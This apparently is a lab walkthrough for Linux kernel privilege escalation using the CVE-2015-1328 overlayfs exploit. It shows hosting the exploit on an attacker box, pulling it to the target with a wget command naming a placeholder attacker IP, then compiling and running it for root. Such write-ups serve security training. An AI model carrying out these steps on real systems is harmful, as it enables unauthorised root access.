Step 1. Identify the kernel version :

![](https://miro.medium.com/v2/resize:fit:517/1*QbclEEzfwqxOtak8vyYLKw.jpeg)

Find the kernel version using “uname -a” command

Step 2. Search and find an exploit code for the kernel version :

We have discovered the CVE-[2015–1328](https://nvd.nist.gov/vuln/detail/CVE-2015-1328) and the exploit code in the previous task ( Visit the website [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292) ).

Download the exploit code file to the AttackBox (your attacker machine) :

![](https://miro.medium.com/v2/resize:fit:700/1*_FaEDChjExp5Qogn6sWjKg.jpeg)

After downloading it, I renamed it **“ofs.c”** to make it easier to understand in the following steps.

![](https://miro.medium.com/v2/resize:fit:700/1*foTG5n0tI4hQgtvwc95jCQ.jpeg)

The Exploit Code File called ofs.c

Transfer the exploit code from the AttackBox to the target system using the `SimpleHTTPServer` Python module and `wget` command respectively :

![](https://miro.medium.com/v2/resize:fit:700/1*7x1wYB6s5GWEuwbD2vKoWg.jpeg)

Launch the Python **HTTP server** on the **AttackBox** side (I specified the port number as 9000, default one is 8000)

On the target machine side :

![](https://miro.medium.com/v2/resize:fit:700/1*3JqV9_MlJwdRLE__w9KUqw.jpeg)

Transferring the exploit file to the target

wget http://ATTACKBOX_IP:9000/ofs.c -P /tmp/

In the wget command above, the `-P` option specifies that the file should be saved to the `/tmp/` directory on the target machine. In order to avoid the permission error while running the `wget` command because you are a low-level privilege user, it would be better to specify the path as `/tmp/` where the file be downloaded.

Navigate to the `/tmp/` directory on the target machine in order to see the exploit code file :

![](https://miro.medium.com/v2/resize:fit:700/1*xVeMEaC1coxRIIoBYYX4pA.jpeg)

We have the exploit code file on the target side now

Now we can use the exploit code file to perform privilege escalation. However remember that :

“Some exploits may require further interaction once they are run. **Read all comments and instructions provided with the exploit code.**”

![](https://miro.medium.com/v2/resize:fit:700/1*quUDkmLiirmCu2mUEd-4IQ.jpeg)

The instructions given in the comment lines of the exploit code

You can investigate the comment lines clearly via [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)

The first step we will do before running the exploit code is to compile this code file :

gcc ofs.c -o ofs

The code `gcc ofs.c -o ofs` is used to compile a C source code file named "ofs.c" into a binary executable file named "ofs" on a Linux operating system. The `gcc` command is the GNU Compiler Collection, a commonly used compiler for the C programming language on Linux and other Unix-like operating systems. The `ofs.c` file contains the C source code that will be compiled into the executable file. The `-o` option in the command specifies the output file name, which in this case is "ofs". To run the compiled executable file, simply type `./ofs` in the command line after compiling the C source code.

Let us compile the exploit code file `ofs.c` using the command `gcc ofs.c -o ofs` before running it :

![](https://miro.medium.com/v2/resize:fit:700/1*kA7uKXcZQ-R9hHFn1CWnBA.jpeg)

We have compiled the ofs.c and obtained the output file as “ofs”.

Now we can run the exploit code using the compiled file “`ofs`”.

3. Run the exploit :

Before running the exploit code, we are the low-level privilege user at the moment we have the compiled exploit code file as shown below :

![](https://miro.medium.com/v2/resize:fit:700/1*ISpy-8TMErtqQEc_OlJ_dw.jpeg)

Before running the exploit code

Let us run the exploit code typing `./ofs` in the command line and now you are root.